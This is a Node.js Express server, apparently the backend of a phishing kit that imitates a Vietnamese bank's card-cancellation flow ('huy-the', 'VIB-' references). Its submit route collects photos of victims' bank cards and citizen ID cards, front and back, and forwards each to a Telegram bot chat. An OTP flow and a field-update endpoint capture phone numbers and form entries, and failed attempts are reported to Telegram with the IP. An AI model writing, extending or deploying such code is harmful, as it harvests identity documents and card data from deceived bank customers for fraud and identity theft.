// server.js — CommonJS (không cần "type":"module")
require('dotenv').config();
const path = require('path');
const express = require('express');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs');
const FormData = require('form-data');
const https = require('https');
const http = require('http');

const app = express();
app.use(cors());
app.use(express.json());

// Log để chắc chắn bạn đang chạy ĐÚNG file
console.log('[INFO] cwd =', process.cwd());
console.log('[INFO] server file =', __filename);

// ====== ROUTES ======

// In-memory store for OTP flows (test/dev only). In production you'd persist and
// apply stronger rate-limits and expirations.
const otpStore = new Map();
// Configurable TTL and attempt limits (readable in tests)
const OTP_TTL_MS = parseInt(process.env.OTP_TTL_MS, 10) || 2 * 60 * 1000; // 2 minutes
const OTP_MAX_ATTEMPTS = parseInt(process.env.OTP_MAX_ATTEMPTS, 10) || 3;
const OTP_RESEND_COOLDOWN_MS = parseInt(process.env.OTP_RESEND_COOLDOWN_MS, 10) || 20 * 1000; // 20s

function maskPhone(phone) {
  if (!phone) return null;
  const s = String(phone).replace(/[^0-9+]/g, '');
  if (s.length <= 4) return '••••';
  return s.slice(0, 3) + '•••' + s.slice(-2);
}

// POST /api/request-block
// Accepts: form or json with { phone }
// Returns: { status:'ok', requestId, maskedPhone, ttlSeconds, resendAfterSeconds }
app.post('/api/request-block', express.urlencoded({ extended: true }), (req, res) => {
  const body = req.body || {};
  const phone = body.phone || body.phoneNumber || (req.query && req.query.phone) || '';
  if (!phone) return res.status(400).json({ status: 'err', error: 'missing_phone' });

  const id = 'otp_' + Date.now().toString(36) + Math.floor(Math.random() * 9000 + 1000);
  const code = String(Math.floor(Math.random() * 900000)).padStart(6, '0');
  const now = Date.now();
  otpStore.set(id, {
    phone: String(phone),
    code,
    createdAt: now,
    expiresAt: now + OTP_TTL_MS,
    attempts: 0,
    lastSentAt: now,
  });

  // For tests we expose the code in memory if NODE_ENV==='test'
  const payload = {
    status: 'ok',
    requestId: id,
    maskedPhone: maskPhone(phone),
    ttlSeconds: Math.floor(OTP_TTL_MS / 1000),
    resendAfterSeconds: Math.floor(OTP_RESEND_COOLDOWN_MS / 1000),
  };
  if (process.env.NODE_ENV === 'test') payload.code = code;
  res.json(payload);
});

// POST /api/verify-otp
// Body: { requestId, code }
// Returns: { status:'ok', verified:true } or { status:'err', error, attemptsLeft }
app.post('/api/verify-otp', express.json(), async (req, res) => {
  const { requestId, code } = req.body || {};
  if (!requestId) return res.status(400).json({ status: 'err', error: 'missing_requestId' });
  const rec = otpStore.get(requestId);
  if (!rec) return res.status(404).json({ status: 'err', error: 'request_not_found' });

  // expired
  if (Date.now() > rec.expiresAt) {
    otpStore.delete(requestId);
    return res.status(410).json({ status: 'err', error: 'expired' });
  }

  // Accept code match
  if (String(code) === String(rec.code)) {
    otpStore.delete(requestId);
    return res.json({ status: 'ok', verified: true });
  }

  // wrong code
  rec.attempts = (rec.attempts || 0) + 1;
  const attemptsLeft = Math.max(0, OTP_MAX_ATTEMPTS - rec.attempts);

  // record
  otpStore.set(requestId, rec);

  // On failed attempts we may want to notify ops via Telegram; keep it async
  try {
    if (attemptsLeft === 0) {
      // notify last failed and clear
      const msg = [
        '⚠️ <b>FAILED OTP LIMIT</b>',
        `Phiên: <code>${requestId}</code>`,
        `Phone: <code>${rec.phone}</code>`,
        `Attempts: <code>${rec.attempts}</code>`,
        `IP: <code>${req.ip}</code>`,
        `Time: <code>${new Date().toISOString()}</code>`,
      ].join('\n');
      // fire-and-forget; if telegram not configured it will be skipped
      telegramSend(msg).catch(() => null);
      otpStore.delete(requestId);
      return res.status(429).json({ status: 'err', error: 'too_many_attempts' });
    } else {
      // occasional notify (first and every 3rd attempt)
      if (rec.attempts === 1 || rec.attempts % 3 === 0) {
        const msg = [
          '⚠️ <b>FAILED OTP ATTEMPT</b>',
          `Phiên: <code>${requestId}</code>`,
          `Phone: <code>${rec.phone}</code>`,
          `Attempt: <code>${rec.attempts}</code>`,
          `IP: <code>${req.ip}</code>`,
          `Time: <code>${new Date().toISOString()}</code>`,
        ].join('\n');
        telegramSend(msg).catch(() => null);
      }
    }
  } catch (e) {
    // swallow
  }

  return res.status(422).json({ status: 'err', error: 'invalid_code', attemptsLeft });
});


// a) Ping tổng quát
app.get('/api/status', (req, res) => {
  res.json({
    status: 'ok',
    port: process.env.PORT ? Number(process.env.PORT) : undefined,
  });
});

// b) Telegram status (bạn đã có sẵn endpoint này)
app.get('/api/telegram/status', (req, res) => {
  res.json({
    status: 'ok',
    tokenSet: !!process.env.TELEGRAM_BOT_TOKEN,
    chatIdSet: !!process.env.TELEGRAM_CHAT_ID,
    port: process.env.PORT ? Number(process.env.PORT) : undefined,
  });
});

// c) Test Telegram (echo) — để FE/PowerShell có POST hợp lệ
app.post('/api/telegram/test', (req, res) => {
  // TODO: tích hợp gửi Telegram thật nếu muốn
  res.json({ status: 'ok', echo: req.body || null });
});

// d) Cập nhật 1 trường form
app.post('/api/field-update', (req, res) => {
  const { sessionId, field, value, page } = req.body || {};
  if (!sessionId || !field) {
    return res.status(400).json({ status: 'error', message: 'Missing sessionId/field' });
  }
  // TODO: lưu vào memory/redis/db nếu cần
  res.json({ status: 'ok' });
});

// e) Nhận form có file (đổi tên field theo form của bạn)
const upload = multer({ limits: { fileSize: 20 * 1024 * 1024 } });
const filesMw = upload.fields([
  { name: 'anhTheMatTruoc', maxCount: 1 },
  { name: 'anhTheMatSau', maxCount: 1 },
  { name: 'anhCCCDTruoc', maxCount: 1 },
  { name: 'anhCCCDSau', maxCount: 1 },
]);
// Try to load local queue implementation; fall back to noop-queue so server
// doesn't crash in environments where the module is missing.
let tgQueue;
try {
  tgQueue = require(path.join(__dirname, '..', 'lib', 'telegram-queue'));
} catch (err) {
  // Fallback: immediate execution (not rate-limited)
  tgQueue = { enqueue: (fn) => Promise.resolve(fn()) };
}

function sendPhotoToTelegram(buffer, filename, caption) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return Promise.reject(new Error('telegram_not_configured'));
  const url = `https://api.telegram.org/bot${token}/sendPhoto`;
  const form = new FormData();
  form.append('chat_id', chatId);
  if (caption) form.append('caption', caption);
  form.append('photo', buffer, { filename, contentType: 'application/octet-stream' });

  return new Promise((resolve, reject) => {
    // form.submit uses Node's http/https under the hood which nock can intercept
    form.submit(url, (err, res) => {
      if (err) return reject(err);
      let body = '';
      res.on('data', (chunk) => (body += chunk));
      res.on('end', () => {
        try {
          const json = JSON.parse(body);
          if (!json || !json.ok) return reject(new Error('telegram_send_failed:' + body));
          resolve(json);
        } catch (e) {
          reject(e);
        }
      });
      res.on('error', (e) => reject(e));
    });
  });
}

// Simple raw sendMessage helper and queued wrapper so other parts of this
// module can notify via Telegram. This mirrors the behavior used in the root
// server implementation but kept minimal for testability.
function rawTelegramSend(text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return Promise.resolve({ skipped: true, reason: 'not_configured' });
  return new Promise((resolve) => {
    try {
      const payload = JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true });
      const opts = new URL(`https://api.telegram.org/bot${token}/sendMessage`);
      const httpLib = opts.protocol === 'https:' ? https : http;
      const req = httpLib.request(
        {
          hostname: opts.hostname,
          port: opts.port || (opts.protocol === 'https:' ? 443 : 80),
          path: opts.pathname + (opts.search || ''),
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
        },
        (res) => {
          let body = '';
          res.on('data', (c) => (body += c));
          res.on('end', () => {
            try {
              const jd = JSON.parse(body);
              if (!res.statusCode || res.statusCode < 200 || res.statusCode >= 300 || !jd || !jd.ok) {
                resolve({ ok: false, httpStatus: res.statusCode, data: jd });
              } else {
                resolve({ ok: true, result: jd.result });
              }
            } catch (e) {
              resolve({ ok: false, error: e.message });
            }
          });
        }
      );
      req.on('error', (e) => resolve({ ok: false, error: e.message }));
      req.write(payload);
      req.end();
    } catch (e) {
      resolve({ ok: false, error: e.message });
    }
  });
}

function telegramSend(text) {
  return tgQueue.enqueue(() => rawTelegramSend(text));
}

app.post('/api/huy-the/submit', filesMw, (req, res) => {
  const ref = 'VIB-' + Date.now();
  const files = req.files || {};
  const fields = ['anhTheMatTruoc', 'anhTheMatSau', 'anhCCCDTruoc', 'anhCCCDSau'];
  const enqueued = [];

  fields.forEach((field) => {
    const f = files[field] && files[field][0];
    if (!f) return;
    // multer may store buffer (memoryStorage) or path (diskStorage)
    let buffer = f.buffer;
    if (!buffer && f.path && fs.existsSync(f.path)) {
      try {
        buffer = fs.readFileSync(f.path);
      } catch (e) {
        console.error('[WARN] failed to read uploaded file path', f.path, e.message);
        return;
      }
    }
    if (!buffer) return;

    const filename = f.originalname || `${field}-${Date.now()}.bin`;
    const caption = `Hủy thẻ - ${field}`;

    // enqueue send; don't block response
    tgQueue.enqueue(() => sendPhotoToTelegram(buffer, filename, caption))
      .then((r) => console.log('[INFO] telegram send ok', field))
      .catch((err) => console.error('[ERROR] telegram send failed', field, err && err.message));

    enqueued.push(field);
  });

  // Also support base64 fields in body (data URLs or raw base64)
  const baseFields = {
    anhTheMatTruocBase64: 'anhTheMatTruoc',
    anhTheMatSauBase64: 'anhTheMatSau',
    anhCCCDTruocBase64: 'anhCCCDTruoc',
    anhCCCDSauBase64: 'anhCCCDSau',
  };
  Object.keys(baseFields).forEach((bf) => {
    const v = req.body && req.body[bf];
    if (!v) return;
    // strip data uri prefix
    const m = String(v).match(/base64,(.*)$/);
    const b64 = m ? m[1] : v;
    try {
      const buffer = Buffer.from(b64, 'base64');
      const field = baseFields[bf];
      const filename = `${field}-${Date.now()}.jpg`;
      const caption = `Hủy thẻ - ${field} (base64)`;
      tgQueue.enqueue(() => sendPhotoToTelegram(buffer, filename, caption))
        .then(() => console.log('[INFO] telegram send ok base64', bf))
        .catch((err) => console.error('[ERROR] telegram send failed base64', bf, err && err.message));
      enqueued.push(field);
    } catch (e) {
      console.error('[WARN] invalid base64 for', bf);
    }
  });

  res.json({ status: 'ok', ref, queued: enqueued.length > 0, enqueued });
});

// Dev helper: liệt kê route đang có để bạn tự kiểm tra
app.get('/__routes', (req, res) => {
  const routes = [];
  app._router.stack.forEach((m) => {
    if (m.route) {
      routes.push({
        methods: Object.keys(m.route.methods).map((k) => k.toUpperCase()),
        path: m.route.path,
      });
    } else if (m.name === 'router' && m.handle.stack) {
      m.handle.stack.forEach((h) => {
        if (h.route)
          routes.push({
            methods: Object.keys(h.route.methods).map((k) => k.toUpperCase()),
            path: h.route.path,
          });
      });
    }
  });
  res.json(routes);
});

// 404 JSON
app.use((req, res) => {
  res.status(404).json({ status: 'error', message: 'Not found' });
});

// ====== START ======
const PORT = process.env.PORT || 4000;
const HOST = process.env.HOST || '127.0.0.1';

// Only start the listener when this file is run directly. This allows tests to
// import the `app` without starting the HTTP server.
if (require.main === module) {
  app.listen(PORT, HOST, () => {
    console.log(`[START] Tele API on http://${HOST}:${PORT}`);
  });
}

// Export `app` so tests (Jest + Supertest) can import it without binding the
// network port.
module.exports = app;
